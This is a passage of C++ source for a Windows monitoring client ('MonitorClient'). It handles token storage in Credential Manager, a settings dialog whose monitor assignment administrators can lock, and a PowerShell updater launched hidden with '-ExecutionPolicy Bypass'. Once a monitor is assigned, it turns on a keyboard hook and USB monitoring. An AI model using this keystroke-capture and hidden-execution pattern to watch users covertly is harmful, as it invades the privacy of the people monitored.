        // Memory management check every 2 minutes (more frequent)
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastMemoryCheck).count() >= 120) {
            manageMemoryLimits();
            cleanupTemporaryFiles(); // Also clean up temporary files
            lastMemoryCheck = now;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Reduced sleep time for more responsive checking
    }
}



// Machine-specific UI preferences belong in HKCU, not a separate mutable INI file
// shipped alongside the executable. Intervals still come from server config.
static const char* kClientPreferencesRegistry="Software\\MonitorClient\\v1.5";
static void saveClientSetting(const char* section,const char* key,const std::string& value) {
    HKEY handle=nullptr;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,kClientPreferencesRegistry,0,nullptr,0,
                       KEY_SET_VALUE,nullptr,&handle,nullptr)!=ERROR_SUCCESS)return;
    const std::string name=std::string(section)+"_"+key;
    RegSetValueExA(handle,name.c_str(),0,REG_SZ,
                   reinterpret_cast<const BYTE*>(value.c_str()),static_cast<DWORD>(value.size()+1));
    RegCloseKey(handle);
}
static std::string readClientSetting(const char* section,const char* key,const std::string& defaultValue) {
    HKEY handle=nullptr;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,kClientPreferencesRegistry,0,KEY_QUERY_VALUE,&handle)!=ERROR_SUCCESS)
        return defaultValue;
    const std::string name=std::string(section)+"_"+key;
    DWORD kind=0,size=0;
    if(RegQueryValueExA(handle,name.c_str(),nullptr,&kind,nullptr,&size)!=ERROR_SUCCESS ||
       kind!=REG_SZ||size==0||size>4096){RegCloseKey(handle);return defaultValue;}
    std::vector<char> buffer(size,0);
    if(RegQueryValueExA(handle,name.c_str(),nullptr,&kind,reinterpret_cast<BYTE*>(buffer.data()),&size)!=ERROR_SUCCESS){
        RegCloseKey(handle);return defaultValue;
    }
    RegCloseKey(handle);
    return std::string(buffer.data());
}
static std::string credentialTarget() {
    return "ACC-Monitor-v1.5/" + serverIP + ":" + serverPort;
}
static void rememberClientToken(const std::string& token) {
    const std::string target=credentialTarget();
    CREDENTIALA cred={};
    cred.Type=CRED_TYPE_GENERIC;
    cred.TargetName=const_cast<char*>(target.c_str());
    cred.CredentialBlobSize=static_cast<DWORD>(token.size());
    cred.CredentialBlob=(LPBYTE)token.data();
    cred.Persist=CRED_PERSIST_LOCAL_MACHINE;
    cred.UserName=const_cast<char*>("ACC Monitor Client");
    if (!CredWriteA(&cred,0))
        showToastNotification("Session storage","Windows Credential Manager could not store the session.","error");
}
static std::string readClientToken() {
    const std::string target=credentialTarget();
    PCREDENTIALA cred=nullptr;
    std::string token;
    if(CredReadA(target.c_str(),CRED_TYPE_GENERIC,0,&cred) && cred){
        token.assign(reinterpret_cast<const char*>(cred->CredentialBlob),cred->CredentialBlobSize);
        CredFree(cred);
    }
    return token;
}
static Json::Value callClientAuth(const Json::Value& body) {
    Json::Value result;Json::CharReaderBuilder builder;std::string errors;
    std::istringstream input(httpPost(API_BASE_URL+"/client_auth.php",Json::FastWriter().write(body)));
    if(!Json::parseFromStream(builder,input,&result,&errors))result=Json::objectValue;
    return result;
}
bool restoreClientSession() {
    const std::string saved=readClientToken();
    if(saved.size()!=64) return false;
    {std::lock_guard<std::mutex> guard(authMutex);clientToken=saved;}
    Json::Value req;req["action"]="restore";
    const Json::Value answer=callClientAuth(req);
    if(!answer.get("success",false).asBool()){
        {std::lock_guard<std::mutex> guard(authMutex);clientToken.clear();}
        return false;
    }
    signedInUsername=answer["user"].get("user_no","").asString();
    signedInFullName=answer["user"].get("name","").asString();
    selectedMonitorId.store(answer.get("monitor_id",0).asInt());
    if(selectedMonitorId.load()>0){
        if(!keyboardHook) setupKeyboardHook();
        if(!usbMonitoringActive)setupUSBMONITORING();
    }
    connectionStatus.serverConnected=true;
    updateTrayIcon();
    return true;
}
// API strings use UTF-8; Windows-native edit controls use UTF-16.
static std::wstring utf8ToWide(const std::string& utf8) {
    if(utf8.empty())return {};
    const int n=MultiByteToWideChar(CP_UTF8,MB_ERR_INVALID_CHARS,utf8.data(),
                                   static_cast<int>(utf8.size()),nullptr,0);
    if(n<=0)return {};
    std::wstring result(static_cast<size_t>(n),L'\0');
    MultiByteToWideChar(CP_UTF8,MB_ERR_INVALID_CHARS,utf8.data(),
                        static_cast<int>(utf8.size()),&result[0],n);
    return result;
}
static std::string wideToUtf8(const std::wstring& wide) {
    if(wide.empty())return {};
    const int n=WideCharToMultiByte(CP_UTF8,0,wide.data(),static_cast<int>(wide.size()),
                                   nullptr,0,nullptr,nullptr);
    if(n<=0)return {};
    std::string result(static_cast<size_t>(n),'\0');
    WideCharToMultiByte(CP_UTF8,0,wide.data(),static_cast<int>(wide.size()),
                        &result[0],n,nullptr,nullptr);
    return result;
}
static std::string editText(HWND dlg,int id) {
    const HWND control=GetDlgItem(dlg,id);
    if(!control)return {};
    const int count=GetWindowTextLengthW(control);
    if(count<=0||count>4096)return {};
    std::wstring result(static_cast<size_t>(count)+1,L'\0');
    const int read=GetWindowTextW(control,&result[0],count+1);
    result.resize(static_cast<size_t>(std::max(0,read)));
    return wideToUtf8(result);
}
static void setWindowUtf8Text(HWND control,const std::string& text) {
    const std::wstring wide=utf8ToWide(text);
    if(control)SetWindowTextW(control,wide.c_str());
}
static void setDlgUtf8Text(HWND dialog,int id,const std::string& text) {
    setWindowUtf8Text(GetDlgItem(dialog,id),text);
}
static int showUtf8Message(HWND parent,const std::string& text,const std::string& title,UINT flags) {
    const std::wstring body=utf8ToWide(text),caption=utf8ToWide(title);
    return MessageBoxW(parent,body.c_str(),caption.c_str(),flags);
}
enum {
    AUTH_TABS=4100,AUTH_USER=4101,AUTH_PASS=4102,AUTH_CONFIRM=4103,
    AUTH_CONFIRM_LABEL=4104,AUTH_SUBMIT=4105,AUTH_SERVER=4106,
    SETTINGS_USER=4200,SETTINGS_IP=4201,SETTINGS_PORT=4202,
    SETTINGS_MONITOR=4203,SETTINGS_LABEL=4204,SETTINGS_OS=4205,
    SETTINGS_MACHINE=4206,SETTINGS_REMARK=4207,
    SETTINGS_NOTIFY=4208,SETTINGS_SAVE=4209,SETTINGS_LOGOUT=4210,
    SETTINGS_TEST=4211,SETTINGS_CONNECTION=4212,SETTINGS_CLOSE=4213,
    SETTINGS_MONITOR_HEADING=4214,SETTINGS_MONITOR_DIVIDER=4215,
    SETTINGS_MONITOR_IP=4216,SETTINGS_USER_HEADING=4217,
    AUTH_FULLNAME=4300,AUTH_FULLNAME_LABEL=4301,
    SETTINGS_USER_NO=4218, SETTINGS_ENROLL=4220,
    SETTINGS_SWITCH=4221, SETTINGS_NOTICE=4222,
    SETTINGS_OS_MAC=4223, SETTINGS_OS_UBUNTU=4224,
    SETTINGS_MACHINE_DESKTOP=4225, SETTINGS_LOCK_SETTINGS=4226,
    SETTINGS_EDIT=4227,SETTINGS_SIGNIN_USER=4232,SETTINGS_SIGNIN_PASS=4233,
    SETTINGS_SEND_ALL=4234,SETTINGS_REFRESH_CONFIG=4235,SETTINGS_ACCOUNT_INFO=4236,
    SETTINGS_UPDATE_HEADING=4240,SETTINGS_UPDATE_URL=4241,
    SETTINGS_UPDATE_CHECK=4242,SETTINGS_UPDATE_INSTALL=4243,SETTINGS_UPDATE_STATUS=4244,
    SETTINGS_INFO_NAME=4228,SETTINGS_INFO_OS=4229,
    SETTINGS_INFO_MACHINE=4230,SETTINGS_INFO_REMARK=4231
};
static HWND addControl(HWND parent,const char* cls,const char* label,DWORD style,
                       int x,int y,int width,int height,int id) {
    const std::wstring wClass=utf8ToWide(cls),wLabel=utf8ToWide(label);
    HWND control=CreateWindowExW(0,wClass.c_str(),wLabel.c_str(),
        WS_CHILD|WS_VISIBLE|style,x,y,width,height,parent,
        (HMENU)(INT_PTR)id,GetModuleHandleW(nullptr),nullptr);
    if(control)SendMessageW(control,WM_SETFONT,
        reinterpret_cast<WPARAM>(GetStockObject(DEFAULT_GUI_FONT)),TRUE);
    return control;
}
// Exact 18-byte header plus three UTF-16 zero words, DWORD-aligned.
struct alignas(DWORD) EmptyDialogTemplate {
    DWORD style, extendedStyle;
    WORD itemCount;
    short x,y,cx,cy;
    WORD menu, windowClass, title;
};
static_assert(offsetof(EmptyDialogTemplate,menu)==18,"Invalid dialog template layout");
static INT_PTR runDialog(DLGPROC proc,short height=195) {
    EmptyDialogTemplate t{};
    t.style=DS_MODALFRAME|WS_POPUP|WS_CAPTION|WS_SYSMENU|DS_CENTER;
    t.x=20;t.y=20;t.cx=285;t.cy=height;
    return DialogBoxIndirectParamW(GetModuleHandleW(nullptr),
        reinterpret_cast<const DLGTEMPLATE*>(&t),hMainWindow,proc,0);
}
bool showClientLogin() {
    // First run and tray Settings use the same window; never clear a valid session.
    return showMonitorSettings();
}
static Json::Value settingsMonitors;
static bool settingsMonitorLocked=false;
static bool settingsEditing=false;
static std::string settingsPendingUserNo;
static void checkSettingsRadio(HWND dlg,int first,int second,int third,int value) {
    const int ids[]={first,second,third};
    for(int id:ids)if(id)CheckDlgButton(dlg,id,id==value?BST_CHECKED:BST_UNCHECKED);
}
static void changeMonitorFields(HWND dlg) {
    int ix=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
    int id=ix>=0?(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,ix,0):0;
    settingsMonitorLocked=false;
    settingsEditing=(id==-1);
    setDlgUtf8Text(dlg,SETTINGS_SAVE,id==-1?"Add Monitor":"Save");
    setDlgUtf8Text(dlg,SETTINGS_REMARK,"");
    setDlgUtf8Text(dlg,SETTINGS_INFO_OS,"—");
    setDlgUtf8Text(dlg,SETTINGS_INFO_MACHINE,"—");
    setDlgUtf8Text(dlg,SETTINGS_INFO_REMARK,"—");
    checkSettingsRadio(dlg,SETTINGS_OS,SETTINGS_OS_MAC,SETTINGS_OS_UBUNTU,SETTINGS_OS);
    checkSettingsRadio(dlg,SETTINGS_MACHINE,SETTINGS_MACHINE_DESKTOP,0,SETTINGS_MACHINE);
    if(id<1){
        setDlgUtf8Text(dlg,SETTINGS_MONITOR_IP,"—");
        return;
    }
    for(const auto &monitor:settingsMonitors){
        if(monitor.get("id",0).asInt()!=id)continue;
        const std::string remark=monitor.get("remark","").asString();
        setDlgUtf8Text(dlg,SETTINGS_REMARK,remark);
        setDlgUtf8Text(dlg,SETTINGS_INFO_REMARK,remark.empty()?"—":remark);
        const std::string platform=monitor.get("platform","Windows").asString();
        setDlgUtf8Text(dlg,SETTINGS_INFO_OS,platform);
        checkSettingsRadio(dlg,SETTINGS_OS,SETTINGS_OS_MAC,SETTINGS_OS_UBUNTU,
            platform=="Mac"?SETTINGS_OS_MAC:platform=="Ubuntu"?SETTINGS_OS_UBUNTU:SETTINGS_OS);
        const bool desktop=monitor.get("type","").asString()=="desktop";
        setDlgUtf8Text(dlg,SETTINGS_INFO_MACHINE,desktop?"Desktop":"Laptop");
        checkSettingsRadio(dlg,SETTINGS_MACHINE,SETTINGS_MACHINE_DESKTOP,0,
            desktop?SETTINGS_MACHINE_DESKTOP:SETTINGS_MACHINE);
        settingsMonitorLocked=id==selectedMonitorId.load() &&
            (monitor.get("settings_locked",false).asBool() ||
             monitor.get("settings_locked",0).asInt()==1);
        break;
    }
}

static bool applyUnifiedServer(HWND dlg) {
    const std::string host=editText(dlg,SETTINGS_IP),port=editText(dlg,SETTINGS_PORT);
    if(host.empty()||host.find_first_of(" /\\\r\n\t")!=std::string::npos ||
       port.empty()||port.find_first_not_of("0123456789")!=std::string::npos ||
       port.size()>5||std::atoi(port.c_str())<1||std::atoi(port.c_str())>65535) {
        showUtf8Message(dlg,"Enter a valid server IP/hostname and port.","Server Settings",MB_OK|MB_ICONWARNING);
        return false;
    }
    if(host!=serverIP||port!=serverPort){
        if(!getClientToken().empty()){
            Json::Value revoke;revoke["action"]="logout";
            callClientAuth(revoke);
        }
        const std::string oldTarget=credentialTarget();
        CredDeleteA(oldTarget.c_str(),CRED_TYPE_GENERIC,0);
        {std::lock_guard<std::mutex> g(authMutex);clientToken.clear();}
        selectedMonitorId.store(0);
        signedInUsername.clear();
        if(keyboardHook)removeKeyboardHook();
        serverIP=host;serverPort=port;
        API_BASE_URL=(port=="8924"?"http://":"https://")+host+":"+port;
        connectionStatus.serverConnected=false;
    }
    saveClientSetting("Server","ip",host);
    saveClientSetting("Server","port",port);
    updateTrayIcon();
    return true;
}

static bool settingsAssignmentLocked=false;
static std::string settingsDirectoryError;
static std::string selectedUserNo(HWND dlg) {
    const HWND combo=GetDlgItem(dlg,SETTINGS_USER_NO);
    const int ix=(int)SendMessageW(combo,CB_GETCURSEL,0,0);
    if(ix==CB_ERR || ix==0)return {};
    const int length=(int)SendMessageW(combo,CB_GETLBTEXTLEN,ix,0);
    if(length<=0||length>2048)return {};
    std::wstring item(static_cast<size_t>(length)+1,L'\0');
    SendMessageW(combo,CB_GETLBTEXT,ix,(LPARAM)item.data());
    const size_t slash=item.find(L": ");
    if(slash==std::wstring::npos)return {};
    return wideToUtf8(item.substr(0,slash));
}
static void selectDirectoryUser(HWND dlg,const std::string& userNo) {
    const HWND combo=GetDlgItem(dlg,SETTINGS_USER_NO);
    if(userNo.empty()){SendMessageW(combo,CB_SETCURSEL,0,0);return;}
    const std::wstring prefix=utf8ToWide(userNo+": ");
    const int index=(int)SendMessageW(combo,CB_FINDSTRING,(WPARAM)-1,(LPARAM)prefix.c_str());
    SendMessageW(combo,CB_SETCURSEL,index>=0?index:0,0);
}
static std::string sortableMonitorField(std::string value,bool ip=false){
    std::transform(value.begin(),value.end(),value.begin(),
        [](unsigned char c){return static_cast<char>(std::tolower(c));});
    if(ip){
        unsigned a=0,b=0,d=0,e=0;
        if(std::sscanf(value.c_str(),"%u.%u.%u.%u",&a,&b,&d,&e)==4
            && a<256&&b<256&&d<256&&e<256){
            char result[16]{};
            std::snprintf(result,sizeof(result),"%03u.%03u.%03u.%03u",a,b,d,e);
            return result;
        }
    }
    return value;
}
static void sortMonitorOptions(Json::Value& monitors){
    if(!monitors.isArray()||monitors.size()<2)return;
    std::vector<Json::Value> entries;
    for(const auto& item:monitors)entries.push_back(item);
    std::stable_sort(entries.begin(),entries.end(),[](const Json::Value& a,const Json::Value& b){
        for(const char* field:{"type","platform","ip_address"}){
            const bool ip=std::strcmp(field,"ip_address")==0;
            const std::string av=sortableMonitorField(a.get(field,"").asString(),ip);
            const std::string bv=sortableMonitorField(b.get(field,"").asString(),ip);
            if(av!=bv)return av<bv;
        }
        return a.get("id",0).asInt()<b.get("id",0).asInt();
    });
    monitors=Json::arrayValue;
    for(const auto& item:entries)monitors.append(item);
}
static void refreshUnifiedMonitors(HWND dlg) {
    settingsMonitors=Json::arrayValue;
    HWND selector=GetDlgItem(dlg,SETTINGS_MONITOR);
    SendMessageW(selector,CB_RESETCONTENT,0,0);
    if(!getClientToken().empty()){
        Json::Value request;request["action"]="restore";
        const Json::Value answer=callClientAuth(request);
        if(answer.get("success",false).asBool()){
            settingsMonitors=answer.get("monitors",Json::arrayValue);
            sortMonitorOptions(settingsMonitors);
            settingsAssignmentLocked=answer.get("assignment_locked",false).asBool();
            signedInUsername=answer["user"].get("user_no","").asString();
            signedInFullName=answer["user"].get("name","").asString();
            selectedMonitorId.store(answer.get("monitor_id",0).asInt());
            selectDirectoryUser(dlg,signedInUsername);
        }else{
            // Revoked session: stop telemetry using this token.
            const std::string oldTarget=credentialTarget();
            CredDeleteA(oldTarget.c_str(),CRED_TYPE_GENERIC,0);
            {std::lock_guard<std::mutex> guard(authMutex);clientToken.clear();}
            selectedMonitorId.store(0);
            settingsAssignmentLocked=false;
            settingsPendingUserNo.clear();
            signedInUsername.clear();
            signedInFullName.clear();
            if(keyboardHook)removeKeyboardHook();
        }
    }
    int selected=-1;
    for(const auto& m:settingsMonitors){
        const int id=m.get("id",0).asInt();
        const std::string label=m.get("ip_address","-").asString()+" | "+
            m.get("platform","-").asString()+"-"+m.get("type","desktop").asString()+
            " #"+std::to_string(id);
        const std::wstring wide=utf8ToWide(label);
        const int ix=(int)SendMessageW(selector,CB_ADDSTRING,0,(LPARAM)wide.c_str());
        SendMessageW(selector,CB_SETITEMDATA,ix,id);
        if(id==selectedMonitorId.load())selected=ix;
    }
    const int newIndex=(int)SendMessageW(selector,CB_ADDSTRING,0,(LPARAM)L"Add new...");
    SendMessageW(selector,CB_SETITEMDATA,newIndex,(LPARAM)-1);
    SendMessageW(selector,CB_SETCURSEL,selected<0?newIndex:selected,0);
    changeMonitorFields(dlg);
    const int index=(int)SendMessageW(selector,CB_GETCURSEL,0,0);
    const int id=index<0?0:(int)SendMessageW(selector,CB_GETITEMDATA,index,0);
    std::string ip="—";
    for(const auto& m:settingsMonitors)
        if(m.get("id",0).asInt()==id){ip=m.get("ip_address","—").asString();break;}
    setDlgUtf8Text(dlg,SETTINGS_MONITOR_IP,ip);
}
static void updateUnifiedVisibility(HWND dlg) {
    const bool enrolled=!getClientToken().empty();
    const bool pending=!settingsPendingUserNo.empty();
    const bool locked=enrolled&&(settingsAssignmentLocked||settingsMonitorLocked);
    const int monitorControls[] = {
        SETTINGS_MONITOR_HEADING,SETTINGS_MONITOR,
        SETTINGS_LABEL,SETTINGS_OS,SETTINGS_MACHINE,SETTINGS_MONITOR_IP,
        SETTINGS_REMARK,SETTINGS_OS_MAC,SETTINGS_OS_UBUNTU,
        SETTINGS_MACHINE_DESKTOP,SETTINGS_LOCK_SETTINGS,4400,4401,4402,4403,4404,4405
    };
    for(int id:monitorControls)ShowWindow(GetDlgItem(dlg,id),(enrolled||pending)?SW_SHOW:SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_LOGOUT),enrolled?SW_SHOW:SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_TEST),enrolled?SW_HIDE:SW_SHOW);
    const int signInControls[] = {SETTINGS_SIGNIN_USER, SETTINGS_SIGNIN_PASS, 4510, 4511};
    const std::string accountSummary="User No: "+signedInUsername+
        "\nFull name: "+(signedInFullName.empty()?"—":signedInFullName);
    setDlgUtf8Text(dlg,SETTINGS_ACCOUNT_INFO,enrolled?accountSummary:"");
    ShowWindow(GetDlgItem(dlg,SETTINGS_ACCOUNT_INFO),enrolled?SW_SHOW:SW_HIDE);
    for (int id : signInControls)
        ShowWindow(GetDlgItem(dlg, id), enrolled ? SW_HIDE : SW_SHOW);
    ShowWindow(GetDlgItem(dlg,SETTINGS_USER),SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_USER_NO),SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_SEND_ALL),enrolled?SW_SHOW:SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_REFRESH_CONFIG),enrolled?SW_SHOW:SW_HIDE);
    EnableWindow(GetDlgItem(dlg,SETTINGS_SEND_ALL),enrolled&&selectedMonitorId.load()>0);
    EnableWindow(GetDlgItem(dlg,SETTINGS_REFRESH_CONFIG),enrolled&&selectedMonitorId.load()>0);
    EnableWindow(GetDlgItem(dlg,SETTINGS_USER_NO),!locked);
    EnableWindow(GetDlgItem(dlg,SETTINGS_LOGOUT),enrolled);
    EnableWindow(GetDlgItem(dlg,SETTINGS_MONITOR),!locked);
    EnableWindow(GetDlgItem(dlg,SETTINGS_IP),!locked);
    EnableWindow(GetDlgItem(dlg,SETTINGS_PORT),!locked);
    EnableWindow(GetDlgItem(dlg,SETTINGS_TEST),!locked);
    const bool hasNotice=(enrolled&&settingsAssignmentLocked)||!settingsDirectoryError.empty();
    ShowWindow(GetDlgItem(dlg,SETTINGS_NOTICE),hasNotice?SW_SHOW:SW_HIDE);
    if(enrolled&&settingsAssignmentLocked)
        setDlgUtf8Text(dlg,SETTINGS_NOTICE,"User selection is locked. Ask your administrator to edit.");
    else if(!settingsDirectoryError.empty())
        setDlgUtf8Text(dlg,SETTINGS_NOTICE,settingsDirectoryError);
    const int index=(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETCURSEL,0,0);
    const int chosen=index<0?0:(int)SendDlgItemMessageW(dlg,SETTINGS_MONITOR,CB_GETITEMDATA,index,0);
    const bool creating=(enrolled||pending)&&chosen==-1&&!locked;
    const bool existing=enrolled&&chosen>0&&!pending;
    const bool editing=!locked&&(creating || (existing&&settingsEditing));
    // Existing records have a real information view; inputs exist only in Edit
    // or Add new modes. Never leave controls from the previous user visible.
    const int editIds[]={SETTINGS_REMARK,SETTINGS_OS,
        SETTINGS_OS_MAC,SETTINGS_OS_UBUNTU,SETTINGS_MACHINE,SETTINGS_MACHINE_DESKTOP};
    const int infoIds[]={SETTINGS_INFO_OS,SETTINGS_INFO_MACHINE,
        SETTINGS_INFO_REMARK};
    for(int id:editIds)ShowWindow(GetDlgItem(dlg,id),editing?SW_SHOW:SW_HIDE);
    for(int id:infoIds)ShowWindow(GetDlgItem(dlg,id),existing&&!editing?SW_SHOW:SW_HIDE);
    ShowWindow(GetDlgItem(dlg,SETTINGS_EDIT),existing&&!locked?SW_SHOW:SW_HIDE);
    setDlgUtf8Text(dlg,SETTINGS_EDIT,editing?"Cancel Edit":"Edit");
    // Save persists server/notification options even when no monitor details are being edited.
    ShowWindow(GetDlgItem(dlg,SETTINGS_SAVE),SW_SHOW);
    EnableWindow(GetDlgItem(dlg,SETTINGS_SAVE),TRUE);
    setDlgUtf8Text(dlg,SETTINGS_SAVE,creating?"Add Monitor":"Save");
    EnableWindow(GetDlgItem(dlg,SETTINGS_LOCK_SETTINGS),existing&&!locked);
    ShowWindow(GetDlgItem(dlg,SETTINGS_LOCK_SETTINGS),existing?SW_SHOW:SW_HIDE);
    setDlgUtf8Text(dlg,SETTINGS_LOCK_SETTINGS,locked?"Settings Locked":"Lock Settings");
    setDlgUtf8Text(dlg,SETTINGS_CONNECTION,
        enrolled?(selectedMonitorId.load()>0?"● Signed in · Monitor active":"● Signed in · Select monitor"):"● Not signed in");
    ShowWindow(GetDlgItem(dlg,SETTINGS_NOTIFY),SW_SHOW);
    // Compute each position from its original layout, not the last displayed
    // state: opening / switching / disconnecting must never accumulate offsets.
    const int offset=hasNotice?0:58;
    struct Position { int id,x,y; };
    const Position monitorLayout[]={
        {SETTINGS_MONITOR_HEADING,13,346},
        {4400,13,375},{SETTINGS_MONITOR,108,373},{SETTINGS_EDIT,338,373},
        {4402,13,410},{SETTINGS_OS,108,407},{SETTINGS_OS_MAC,200,407},{SETTINGS_OS_UBUNTU,268,407},
        {SETTINGS_INFO_OS,108,410},
        {4403,13,443},{SETTINGS_MACHINE,108,440},{SETTINGS_MACHINE_DESKTOP,220,440},
        {SETTINGS_INFO_MACHINE,108,443},
        {4404,13,476},{SETTINGS_MONITOR_IP,108,476},
        {4405,13,509},{SETTINGS_REMARK,108,506},{SETTINGS_INFO_REMARK,108,509}
    };
    for(const auto& item:monitorLayout)
        SetWindowPos(GetDlgItem(dlg,item.id),nullptr,item.x,item.y-offset,0,0,
                     SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    const int notifyY=(enrolled||pending)?539-offset:(hasNotice?351:285);
    const int updateY=notifyY+38;
    const int buttonsY=updateY+134;
    SetWindowPos(GetDlgItem(dlg,SETTINGS_NOTIFY),nullptr,108,notifyY,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    const Position updateLayout[]={
        {SETTINGS_UPDATE_HEADING,13,updateY},
        {SETTINGS_UPDATE_URL,108,updateY+27},
        {SETTINGS_UPDATE_CHECK,108,updateY+62},
        {SETTINGS_UPDATE_INSTALL,277,updateY+62},
        {SETTINGS_UPDATE_STATUS,108,updateY+94}
    };
    for(const auto& item:updateLayout)
        SetWindowPos(GetDlgItem(dlg,item.id),nullptr,item.x,item.y,0,0,
                     SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    SetWindowPos(GetDlgItem(dlg,SETTINGS_LOCK_SETTINGS),nullptr,214,buttonsY,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    SetWindowPos(GetDlgItem(dlg,SETTINGS_SAVE),nullptr,108,buttonsY,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    SetWindowPos(GetDlgItem(dlg,SETTINGS_CLOSE),nullptr,332,buttonsY,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    SetWindowPos(GetDlgItem(dlg,SETTINGS_SEND_ALL),nullptr,13,buttonsY+43,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    SetWindowPos(GetDlgItem(dlg,SETTINGS_REFRESH_CONFIG),nullptr,174,buttonsY+43,0,0,
                 SWP_NOZORDER|SWP_NOSIZE|SWP_NOACTIVATE);
    const int dialogHeight=(enrolled||pending)?buttonsY+112:buttonsY+78;
    SetWindowPos(dlg,nullptr,0,0,465,dialogHeight,
                 SWP_NOMOVE|SWP_NOZORDER|SWP_NOACTIVATE);
    RedrawWindow(dlg,nullptr,nullptr,RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
}
// Update operations use the bundled, reviewed PowerShell helper, never scripts
// downloaded from the update server. Check and stage execute off the UI thread.
static std::mutex updateResultMutex;
static Json::Value updateResult;
static std::string selectedUpdateVersion;
static bool validUpdateServer(const std::string& raw){
    if(raw.size()>512 ||
       (raw.rfind("http://",0)!=0 && raw.rfind("https://",0)!=0))return false;
    for(unsigned char c:raw){
        if(!std::isalnum(c) && c!=':' && c!='/' && c!='.' && c!='-' &&
           c!='_' && c!='[' && c!=']')return false;
    }
    return true;
}
static Json::Value readUpdateStatusFile(const std::wstring& path) {
    Json::Value result;
    const HANDLE fd=CreateFileW(path.c_str(),GENERIC_READ,FILE_SHARE_READ,nullptr,
                               OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,nullptr);
    if(fd==INVALID_HANDLE_VALUE){result["error"]="Update helper did not produce a result";return result;}
    std::string content;
    BYTE bytes[4096];DWORD count=0;
    while(ReadFile(fd,bytes,sizeof(bytes),&count,nullptr)&&count>0){
        if(content.size()+count>128*1024)break;
        content.append(reinterpret_cast<const char*>(bytes),count);
    }
    CloseHandle(fd);
    Json::CharReaderBuilder parser;
    std::string errors;
    std::istringstream input(content);
    if(!Json::parseFromStream(parser,input,&result,&errors))
        result["error"]="Cannot parse updater response: "+errors;
    return result;
}
static bool launchUpdateHelper(HWND dialog,const std::string& operation,
                               const std::string& updateServer,
                               const std::string& packagePath=std::string(),
                               const std::string& sha=std::string()){
    wchar_t module[MAX_PATH]={0};
    const DWORD count=GetModuleFileNameW(nullptr,module,MAX_PATH);
    if(!count||count>=MAX_PATH)return false;
    std::wstring folder(module);
    const auto slash=folder.find_last_of(L"\\/");
    if(slash==std::wstring::npos)return false;
    folder.resize(slash);
    const std::wstring script=folder+L"\\update-helper.ps1";
    if(GetFileAttributesW(script.c_str())==INVALID_FILE_ATTRIBUTES)return false;
    std::wstring args=L"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \""+
                      script+L"\" -Mode "+utf8ToWide(operation)+
                      L" -CurrentVersion \""+utf8ToWide(APP_VERSION)+L"\"";
    std::wstring resultPath;
    if(operation=="Apply"){
        if(packagePath.empty()||sha.size()!=64)return false;
        args+=L" -PackagePath \""+utf8ToWide(packagePath)+L"\" -ExpectedSha \""+
              utf8ToWide(sha)+L"\" -InstallDir \""+folder+
              L"\" -ParentPid "+std::to_wstring(GetCurrentProcessId());
    }else{
        if(!validUpdateServer(updateServer))return false;
        wchar_t temp[MAX_PATH]={0},file[MAX_PATH]={0};
        if(!GetTempPathW(MAX_PATH,temp)||!GetTempFileNameW(temp,L"MUP",0,file))return false;
        resultPath=file;
        args+=L" -BaseUrl \""+utf8ToWide(updateServer)+
              L"\" -ResultPath \""+resultPath+L"\"";
    }
    SHELLEXECUTEINFOW info{};
    info.cbSize=sizeof(info);
    info.fMask=SEE_MASK_NOCLOSEPROCESS;
    info.lpVerb=operation=="Apply"?L"runas":L"open";
    info.lpFile=L"powershell.exe";
    info.lpParameters=args.c_str();
    info.nShow=SW_HIDE;
    if(!ShellExecuteExW(&info)){
        if(!resultPath.empty())DeleteFileW(resultPath.c_str());
        return false;
    }
    if(operation=="Apply"){
        if(info.hProcess)CloseHandle(info.hProcess);
        return true;
    }
    const int code=operation=="Check"?1:2;
    std::thread([dialog,handle=info.hProcess,path=resultPath,code](){
        Json::Value outcome;
        if(WaitForSingleObject(handle,300000)==WAIT_OBJECT_0){
            outcome=readUpdateStatusFile(path);
        }else outcome["error"]="Update request timed out";
        CloseHandle(handle);
        DeleteFileW(path.c_str());
        {
            std::lock_guard<std::mutex> guard(updateResultMutex);
            updateResult=outcome;
        }
        if(IsWindow(dialog))PostMessageW(dialog,WM_APP+0x275,code,0);
    }).detach();
    return true;
}

static INT_PTR CALLBACK settingsDialogProc(HWND dlg,UINT msg,WPARAM wp,LPARAM lp) {
    switch(msg) {
    case WM_INITDIALOG:{
        activeSettingsWindow=dlg;
        settingsPendingUserNo.clear();
        settingsEditing=false;
        setWindowUtf8Text(dlg,"MonitorClient v"+APP_VERSION+" — Settings");
        HWND logo=addControl(dlg,"STATIC","",SS_ICON,13,10,38,38,4500);
        SendMessageW(logo,STM_SETIMAGE,IMAGE_ICON,(LPARAM)LoadIconW(GetModuleHandleW(nullptr),MAKEINTRESOURCEW(1)));
        if(SendMessageW(logo,STM_GETIMAGE,IMAGE_ICON,0)==0)
            SendMessageW(logo,STM_SETIMAGE,IMAGE_ICON,(LPARAM)LoadIconW(nullptr,IDI_APPLICATION));
        addControl(dlg,"STATIC","MonitorClient",0,62,12,260,21,4501);
        addControl(dlg,"STATIC",("v"+APP_VERSION).c_str(),0,62,33,90,19,4502);
